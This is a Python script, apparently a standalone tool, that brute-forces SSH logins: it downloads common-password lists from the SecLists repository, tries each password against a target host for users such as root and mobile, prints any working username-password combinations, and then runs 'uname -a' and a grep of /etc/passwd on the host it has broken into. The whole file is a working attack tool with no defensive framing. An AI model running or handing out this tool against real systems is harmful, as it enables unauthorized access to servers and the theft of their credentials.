from colorama import init, Fore

# initialize colorama
init(autoreset=True)

YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
RED   = Fore.RED
BLUE  = Fore.BLUE

def get_pass_list(password_list_url):
    from requests import exceptions, get

    try:
        password_list = get(password_list_url)
    except exceptions.RequestException as err:
        print (f"{RED}\nCan't fetch password list" + err)
        return None
    
    if password_list.status_code != 200:
        print (f"{RED}\nCan't fetch password list from \n\n" + password_list_url + "\n\nError code: " + str(password_list.status_code))
        return None
    elif password_list.status_code == 200:
        passlist = password_list.content.decode().splitlines()
        print (f"{GREEN}\nTrying " + str(len(passlist)) + " passwords from " + password_list_url)
        return passlist

def is_ssh_open(hostname, username, password,  port, timeOUT, r, command='uname -a'):
    from paramiko import ssh_exception, SSHException, AuthenticationException, SSHClient, AutoAddPolicy
    from socket import timeout
    from time import sleep

    # initialize SSH client
    client = SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(AutoAddPolicy())
    
    if command != None:
        
        try:
            client.connect(hostname=hostname, username=username, password=password, port=port)

        except timeout:
            print(f"{RED}[!] Host: {hostname} is unreachable, timed out.")
            returning = 2
        except AuthenticationException:
            print(f"{YELLOW}[{r}] Invalid credentials. {username}:{password}@{hostname}")
            returning = 1
        except SSHException:
            print(f"{BLUE}[*] Quota exceeded, retrying with delay...Line 55")
            sleep(2)
            returning = is_ssh_open(hostname, username, password, port, r, command)

        else:
            if command == 'uname -a':
                stdin, stdout, stderr = client.exec_command(command)
                output = stdout.readlines()
                uname = output[0]
                print(f"{GREEN}[{r}] Found combo:\n\tHOST: {hostname}\n\tUSER: {username}\n\tPASS: {password}\n\tUNAME: {uname}")
                returning = 0
            else:
                stdin, stdout, stderr = client.exec_command(command)
                output = stdout.readlines()
                uname = output[0]
                print(f"{GREEN}[+] Found combo:\n\tHOST: {hostname}\n\tUSER: {username}\n\tPASS: {password}\n\tUNAME: {uname}")
                returning = 0

        finally:
            client.close()
            return returning

    elif command == None:
        try:
            client.connect(hostname=hostname, username=username, password=password, port=port)
        except timeout:
            print(f"{RED}[!] Host: {hostname} is unreachable, timed out.")
            returning = 2
        except ssh_exception.NoValidConnectionsError:
            returning = 3
        except AuthenticationException:
            returning = 1
        else:
            returning = 0
        finally:
            client.close()
            return returning

def arg_parser():
    parser = ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", help="IP Address of SSH Server to bruteforce. (example: cracker.py 192.168.1.1)")
    parser.add_argument("-port", help="Port of SSH Server to bruteforce. (example: cracker.py 192.168.1.1 -port 22)", type=int, default=22)
    parser.add_argument("-user", help="User or comma seperated list of users.(example: cracker.py 192.168.1.1 -user root,mobile)", default="root,mobile")
    parser.add_argument("-time", help="How long to wait (number of seconds) for a response. (example: cracker.py 192.168.1.1 -time 20)", type=float, default=0)
    return parser

def get_fqdn(host):
    from socket import gethostbyaddr, herror
    
    fqdn = []
    try:
        fqdn = gethostbyaddr(host)
    except herror:
        print (f"{GREEN}using IP address " + host)
    else:
        host = fqdn[0]
        print (f"{GREEN}using fqdn " + host)
    return host

def pass_finder(host, port, timeOUT, users, users_before_check, password_list_url):
    
    foundAll = False
    found = 0
    userPass = []
    
    for passlist in password_list_url:

        passlist_words = get_pass_list(passlist)
        r = 0
        if passlist_words != None:
            for password in passlist_words:
                r += 1
                for user in users_before_check:

                    ssh_open = is_ssh_open(host, user, password, port, timeOUT, r)

                    if ssh_open == 0:

                        userPass.append([user, password])
                        found += 1
                        users.remove(user)

                        if found == len(users_before_check):
                            print(f"found all password(s) for {users_before_check}")
                            foundAll = True
                            break
                    
                if foundAll == True:
                    break

        if foundAll == True:
            break

    if len(users) != 0:
        print(f"couldn't find password(s) for {users}")
    r = 0
    for uPass in userPass:
        r += 1
        u = uPass[0]
        p = uPass[1]
        is_ssh_open(host, u, p, port, timeOUT, r, command=f'grep -i {u} /etc/passwd')
        #print(f"{GREEN}[+] Found combo:\n\tHOST: {host}\n\tUSER: {u}\n\tPASS: {p}")

    return (userPass)

if __name__ == "__main__":
    from argparse import ArgumentParser

    parser = arg_parser()

    args = parser.parse_args()
    host = args.host
    port = args.port
    timeOUT = args.time
    users = [str(item) for item in args.user.split(',')]

    users_before_check = tuple(users)

    password_list_url = ["https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt",
                         "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords.txt",
                         "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Keyboard-Combinations.txt"]

    host = get_fqdn(host)

    # check if ssh is reachable before we do anything. Passing command=None makes the function skip to line 74
    if is_ssh_open(host, "user", "password", port, timeOUT, 1, command=None) == 3:
        raise SystemExit("Make sure ssh port is open on port " + str(port) + ".") 

    find_userPass = pass_finder(host, port, timeOUT, users, users_before_check, password_list_url)

    print(find_userPass)